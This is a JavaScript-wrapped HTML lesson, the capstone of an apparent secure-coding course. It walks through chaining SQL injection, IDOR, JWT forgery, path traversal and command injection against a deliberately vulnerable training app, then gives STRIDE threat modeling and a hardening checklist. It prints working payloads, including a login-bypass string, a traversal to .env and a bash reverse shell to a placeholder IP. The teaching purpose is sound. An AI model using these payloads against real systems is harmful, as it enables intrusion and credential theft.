window.LESSONS = window.LESSONS || {};
window.LESSONS.capstone = `

<h1 class="lesson-title">Lab 17: Full App Challenge (Capstone)</h1>

<p class="lesson-subtitle">
  You have spent sixteen labs building a deliberately vulnerable application and learning how
  each vulnerability works in isolation. Now it is time to put on the black hat. You are going to
  approach this application as an outsider -- no source code, no inside knowledge -- and chain
  multiple vulnerabilities together to go from anonymous visitor to full system compromise. This
  is how real attackers think, and it is the mindset that will make you a better defender.
</p>

<hr>

<h2 class="step"><span class="step-label">Introduction</span> Think Like an Attacker</h2>

<p>
  Everything you have done so far has been surgical. You knew the vulnerability, you knew the
  endpoint, you knew the payload format. Real attacks do not work that way. A real attacker starts
  with nothing. They see a login page and start probing. They look at HTTP responses for clues.
  They try common payloads against every input they can find. They chain what they discover into
  increasingly powerful attacks.
</p>

<p>
  Here is your challenge: start from the login page of the application you built. Pretend you have
  never seen the source code. Your goal is to chain at least three vulnerabilities to go from
  unauthenticated outsider to full system compromise. Along the way, I want you to think about
  what a real attacker would want at each stage -- not just what is possible, but what is valuable.
</p>

<p>
  The best way to approach this is to think in phases: gain access, escalate privileges, exfiltrate
  data, establish persistence. Each phase uses different vulnerabilities, and the output of one
  phase becomes the input for the next. That chaining is what turns a collection of medium-severity
  bugs into a critical compromise.
</p>

<hr>

<h2 class="step"><span class="step-label">Attack Chain</span> From Login Page to Remote Code Execution</h2>

<p>
  Let me walk you through one possible attack chain. This is not the only path -- part of the
  challenge is finding your own -- but it demonstrates how an attacker thinks step by step.
</p>

<h3>Phase 1: Bypass Authentication with SQL Injection</h3>

<p>
  You land on the login page. You do not have credentials. The first thing you try is SQL
  injection in the login form. You enter <code>' OR 1=1 --</code> as the username and anything
  as the password. If the server builds its SQL query with string concatenation (which you built
  in Lab 02), the query becomes something like
  <code>SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '...'</code>. The
  <code>OR 1=1</code> always evaluates to true. The <code>--</code> comments out the password
  check. The database returns the first user in the table, which is often the admin account.
  You are now logged in as an administrator without knowing any password.
</p>

<h3>Phase 2: Enumerate Data via IDOR</h3>

<p>
  Once inside, you start exploring. You notice that the application loads your notes from an API
  endpoint like <code>/api/notes/1</code>. You change the ID to 2, then 3, then 4. The server
  happily returns notes belonging to other users because it does not check ownership. This is the
  IDOR vulnerability from Lab 08. You systematically enumerate all notes and find API keys,
  internal URLs, and other sensitive data that other users have stored. This is your reconnaissance
  phase -- gathering intelligence for the next steps.
</p>

<h3>Phase 3: Forge a JWT Token</h3>

<p>
  You examine the JWT token the server gave you at login. You decode the payload (it is just
  base64) and see claims like <code>role: "admin"</code> and <code>exp: ...</code>. From
  Lab 07, you know the application uses a weak or default JWT secret. You try common secrets
  like "secret", "password", "jwt_secret", or the app name. Once you find the right one, you can
  forge your own tokens with any role and any expiration. You give yourself a token that never
  expires and has superadmin privileges. Even if someone resets the admin password, your forged
  token still works.
</p>

<h3>Phase 4: Read Source Code via Path Traversal</h3>

<p>
  You notice a file download endpoint, something like <code>/api/files/download?name=report.pdf</code>.
  You try path traversal: <code>?name=../../../app.js</code> or <code>?name=../../../.env</code>.
  If the server does not canonicalize paths and check prefixes (Lab 11: Path Traversal), you can read any file
  on the filesystem that the Node process has permission to access. You download the application's
  source code, its <code>.env</code> file (which contains database credentials, API keys, and the
  JWT secret you already guessed), and its <code>package.json</code> to understand what libraries
  it uses.
</p>

<h3>Phase 5: Get a Shell via Command Injection</h3>

<p>
  From reading the source code, you confirm that the ping utility endpoint uses <code>exec()</code>
  with string interpolation. You send
  <code>{"host": "127.0.0.1; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"}</code>. A reverse shell
  connects back to your machine. You now have interactive command-line access to the server. Game
  over.
</p>

<p>
  Let me recount what just happened: you went from staring at a login page to having a shell on
  the server in five steps. Each step used a different vulnerability. Each step built on what you
  gained in the previous step. No single vulnerability alone would have given you this level of
  access -- it was the chain that made it critical.
</p>

<div class="callout warn">
  <div class="callout-title">Attack Chain Summary</div>
  <div class="callout-text">
    1. SQL injection to bypass login and gain admin access.<br>
    2. IDOR to enumerate all user data and gather intelligence.<br>
    3. JWT forgery to establish persistent, elevated access.<br>
    4. Path traversal to read source code and secrets from the filesystem.<br>
    5. Command injection to achieve remote code execution.<br>
    Five vulnerabilities. Five steps. Total compromise from zero access.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Threat Modeling</span> The Attacker's Mindset</h2>

<p>
  Before you start testing, take a step back and think about what an attacker actually wants. They
  are not popping shells for fun (well, some are). In a real attack, the goals are usually: steal
  data, maintain access, move laterally to other systems, or cause disruption. Understanding
  attacker goals helps you prioritize which vulnerabilities to fix first.
</p>

<h3>STRIDE</h3>

<p>
  STRIDE is a threat modeling framework developed at Microsoft. It gives you a structured way to
  think about what can go wrong. Each letter represents a category of threat:
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">STRIDE Threat Categories</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="cmt">// S - Spoofing:       Can someone pretend to be another user?</span>
<span class="cmt">//     (SQL injection login bypass, JWT forgery)</span>

<span class="cmt">// T - Tampering:      Can someone modify data they shouldn't?</span>
<span class="cmt">//     (Prototype pollution, NoSQL injection)</span>

<span class="cmt">// R - Repudiation:    Can someone deny they performed an action?</span>
<span class="cmt">//     (Missing audit logs, no request tracing)</span>

<span class="cmt">// I - Info Disclosure: Can someone access data they shouldn't?</span>
<span class="cmt">//     (IDOR, path traversal, verbose error messages)</span>

<span class="cmt">// D - Denial of Service: Can someone make the system unavailable?</span>
<span class="cmt">//     (ReDoS, resource exhaustion)</span>

<span class="cmt">// E - Elevation of Privilege: Can someone gain higher access?</span>
<span class="cmt">//     (JWT role manipulation, deserialization RCE)</span>
  </pre>
</div>

<p>
  When you look at your application through the STRIDE lens, you realize that the sixteen
  vulnerabilities you built cover every single category. That is not a coincidence -- these are
  the fundamental ways that applications fail.
</p>

<h3>Attack Trees</h3>

<p>
  An attack tree maps out how vulnerabilities chain together. The root node is the attacker's
  ultimate goal (e.g., "exfiltrate customer data"). The child nodes are the different paths to
  reach that goal. Each path might involve different combinations of vulnerabilities. When you
  think in attack trees, you realize that each individual vulnerability might be medium severity
  on its own, but chained together they are critical. A CVSS 5.0 IDOR plus a CVSS 6.0 path
  traversal plus a CVSS 7.0 command injection does not add up to 18.0 -- it multiplies into a
  total compromise that is effectively a 10.0.
</p>

<h3>Post-Exploitation</h3>

<p>
  Think about what an attacker does AFTER getting remote code execution. They do not just sit there
  feeling satisfied. They install persistence mechanisms -- a cron job that phones home, a modified
  SSH key, a backdoor user account. They pivot to other systems -- if the compromised server has
  database credentials, they connect to the database. If it is on an internal network, they scan
  for other services. They exfiltrate data -- customer records, source code, credentials, API keys.
  And they cover their tracks -- deleting log entries, modifying timestamps, clearing command
  history.
</p>

<p>
  Understanding post-exploitation is important for defense because it tells you what to monitor
  for. If you detect the attack during the post-exploitation phase, you can still limit the damage
  by isolating the compromised system and revoking credentials.
</p>

<hr>

<h2 class="step"><span class="step-label">Hardening</span> The Comprehensive Checklist</h2>

<p>
  Here is every fix you have learned across all sixteen labs, consolidated into a single
  hardening checklist. Each item includes the "why" so you can explain it to your team and
  prioritize based on your application's specific risk profile.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">Application Hardening Checklist</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="cmt"> 1. Parameterized queries everywhere</span>
<span class="cmt">    Why: Prevents SQL injection by separating code from data.</span>
<span class="cmt">    Never build SQL with string concatenation or template literals.</span>

<span class="cmt"> 2. HTML output encoding on all user content</span>
<span class="cmt">    Why: Prevents XSS by ensuring user input is rendered as text, not HTML.</span>
<span class="cmt">    Use your template engine's auto-escaping. Never use innerHTML with user data.</span>

<span class="cmt"> 3. Content Security Policy with nonces</span>
<span class="cmt">    Why: Defense in depth for XSS. Even if encoding is missed, CSP blocks</span>
<span class="cmt">    inline scripts without a valid nonce. Report-only mode first, then enforce.</span>

<span class="cmt"> 4. execFile() instead of exec()</span>
<span class="cmt">    Why: Prevents command injection by avoiding shell interpretation.</span>
<span class="cmt">    Pass arguments as an array. Never set shell: true.</span>

<span class="cmt"> 5. Type checking on all Mongo query inputs</span>
<span class="cmt">    Why: Prevents NoSQL injection. If you expect a string, verify it is a string.</span>
<span class="cmt">    Reject objects where strings are expected: { \$gt: "" } becomes harmless.</span>

<span class="cmt"> 6. CSRF tokens on all state-changing endpoints</span>
<span class="cmt">    Why: Prevents cross-site request forgery. A token tied to the session ensures</span>
<span class="cmt">    requests originate from your application, not a malicious third-party page.</span>

<span class="cmt"> 7. Strong JWT secret from environment, algorithm whitelist</span>
<span class="cmt">    Why: Prevents JWT forgery. A weak secret can be brute-forced. Without an</span>
<span class="cmt">    algorithm whitelist, attackers can switch to "none" or use HMAC with RSA keys.</span>

<span class="cmt"> 8. Ownership checks on every data access</span>
<span class="cmt">    Why: Prevents IDOR. Every database query for user data must include a WHERE</span>
<span class="cmt">    clause that checks the authenticated user's ID. No exceptions.</span>

<span class="cmt"> 9. Freeze __proto__ keys in merge functions</span>
<span class="cmt">    Why: Prevents prototype pollution. Reject or skip keys like __proto__,</span>
<span class="cmt">    constructor, and prototype during object merging operations.</span>

<span class="cmt">10. JSON.parse only, never node-serialize</span>
<span class="cmt">    Why: Prevents deserialization RCE. node-serialize executes functions embedded</span>
<span class="cmt">    in serialized data. JSON.parse is safe -- it only handles data, not code.</span>

<span class="cmt">11. Path canonicalization with prefix checks</span>
<span class="cmt">    Why: Prevents path traversal. Resolve the full path with path.resolve(),</span>
<span class="cmt">    then verify it starts with the intended base directory.</span>

<span class="cmt">12. Simple regex patterns, input length limits</span>
<span class="cmt">    Why: Prevents ReDoS. Avoid nested quantifiers. Check input length before</span>
<span class="cmt">    running any regex. Consider RE2 for guaranteed linear-time matching.</span>

<span class="cmt">13. helmet.js middleware</span>
<span class="cmt">    Why: Sets security headers (X-Frame-Options, Strict-Transport-Security,</span>
<span class="cmt">    X-Content-Type-Options, etc.) that prevent clickjacking, MIME sniffing,</span>
<span class="cmt">    and protocol downgrade attacks. One line of code, multiple protections.</span>

<span class="cmt">14. Rate limiting on auth endpoints</span>
<span class="cmt">    Why: Slows brute-force attacks. Use express-rate-limit or similar middleware</span>
<span class="cmt">    to cap login attempts per IP. Apply stricter limits to password reset flows.</span>

<span class="cmt">15. Structured logging with request IDs</span>
<span class="cmt">    Why: You cannot defend what you cannot see. Attach a unique ID to each</span>
<span class="cmt">    request, log authentication events, log authorization failures, and log</span>
<span class="cmt">    any input validation rejections. This is how you detect attacks in progress.</span>

<span class="cmt">16. Dependency scanning (npm audit, Snyk)</span>
<span class="cmt">    Why: Your code might be secure, but your dependencies might not be. Run</span>
<span class="cmt">    npm audit in CI. Use Snyk or Dependabot for continuous monitoring. A single</span>
<span class="cmt">    vulnerable transitive dependency can undermine all your other defenses.</span>

<span class="cmt">17. Strict CORS with explicit allowlist</span>
<span class="cmt">    Why: Prevents cross-origin data theft. Never reflect the Origin header</span>
<span class="cmt">    blindly. Use an explicit array of allowed origins. Never allow null origin.</span>

<span class="cmt">18. Nonce-based Content Security Policy</span>
<span class="cmt">    Why: Defense in depth against XSS. Even if output encoding is missed,</span>
<span class="cmt">    CSP blocks unauthorized scripts. Include base-uri 'self' and object-src 'none'.</span>

<span class="cmt">19. Layered rate limiting (IP + account)</span>
<span class="cmt">    Why: Stops brute force and credential stuffing. Combine per-IP and per-account</span>
<span class="cmt">    limits with progressive delays. Make login timing constant to prevent enumeration.</span>

<span class="cmt">20. HTML smuggling defenses</span>
<span class="cmt">    Why: Prevents client-side payload assembly that bypasses network security.</span>
<span class="cmt">    Strict CSP blocks inline scripts. Monitor for Blob URL creation patterns.</span>
  </pre>
</div>

<p>
  This is not a "pick five" situation. Every item on this list addresses a distinct attack vector.
  Skip one and you leave a door open. The attacker only needs one open door; you need to lock all
  of them.
</p>

<hr>

<h2 class="step"><span class="step-label">What's Next</span> Continuing Your Security Practice</h2>

<p>
  Finishing this course does not make you a security expert. It makes you a developer who thinks
  about security, which is arguably more valuable. Most security incidents are caused by developers
  who never thought about these issues at all. You now have a mental model for how attackers
  operate, and that changes how you write code.
</p>

<h3>Further Learning</h3>

<p>
  The OWASP Testing Guide is the most comprehensive resource for web application security testing.
  It covers every vulnerability class we discussed and dozens more. When you encounter an
  unfamiliar vulnerability type, the OWASP guide is where you go first.
</p>

<p>
  PortSwigger Web Security Academy is a free, hands-on training platform from the makers of Burp
  Suite. It has labs for every major vulnerability class, with guided exercises and detailed
  explanations. If you want to go deeper on any of the topics from this course, their labs are
  excellent practice.
</p>

<p>
  CTF competitions (Capture The Flag) are timed security challenges where you exploit vulnerable
  applications to find hidden flags. They are a great way to practice under pressure and learn
  from other participants. HackTheBox and TryHackMe are popular platforms with machines that range
  from beginner to expert difficulty.
</p>

<h3>Security Is a Practice, Not a Destination</h3>

<p>
  New vulnerability classes emerge. Dependencies get compromised. Configurations drift. The
  application you secured today will have new attack surface tomorrow when someone adds a feature,
  upgrades a library, or changes a deployment configuration. Security is not a box you check once
  and forget. It is a continuous practice that has to be woven into how your team designs, builds,
  reviews, and operates software.
</p>

<p>
  The most important thing you take from this course is not any specific fix or payload. It is the
  mindset. When you see a new feature request, you now instinctively ask: "What could an attacker
  do with this? What input would break this? What happens if someone calls this endpoint without
  being authorized?" That adversarial thinking, applied consistently, is what separates teams that
  get breached from teams that do not.
</p>

<div class="callout info">
  <div class="callout-title">One Last Thing</div>
  <div class="callout-text">
    Security is a team sport. Share what you have learned. When you see a code review with a
    raw SQL query, explain why parameterized queries matter. When a junior developer reaches for
    <code>exec()</code>, show them <code>execFile()</code>. When someone proposes storing JWTs
    with a hardcoded secret, walk them through the attack. The most effective security improvement
    you can make is not in your own code -- it is in raising the baseline of everyone around you.
  </div>
</div>

<hr>

<h2>Lab 17 Checklist</h2>

<ul class="task-list">
  <li><span class="task-check"></span> Start from the login page and bypass authentication using SQL injection</li>
  <li><span class="task-check"></span> Use IDOR to enumerate notes and data belonging to other users</li>
  <li><span class="task-check"></span> Forge a JWT token with elevated privileges and extended expiration</li>
  <li><span class="task-check"></span> Exploit path traversal to read .env and application source code from the server</li>
  <li><span class="task-check"></span> Achieve remote code execution through command injection</li>
  <li><span class="task-check"></span> Document your complete attack chain: which vulnerabilities you used, in what order, and why</li>
  <li><span class="task-check"></span> Apply the hardening checklist: fix every vulnerability you exploited</li>
  <li><span class="task-check"></span> Run npm audit and address any dependency vulnerabilities</li>
  <li><span class="task-check"></span> Verify each fix by re-running the corresponding attack and confirming it fails</li>
  <li><span class="task-check"></span> Review the STRIDE model against your application and identify any remaining threats</li>
</ul>

<div class="section-nav">
  <button class="nav-btn" data-prev="smuggling">Previous: HTML Smuggling</button>
</div>

`;
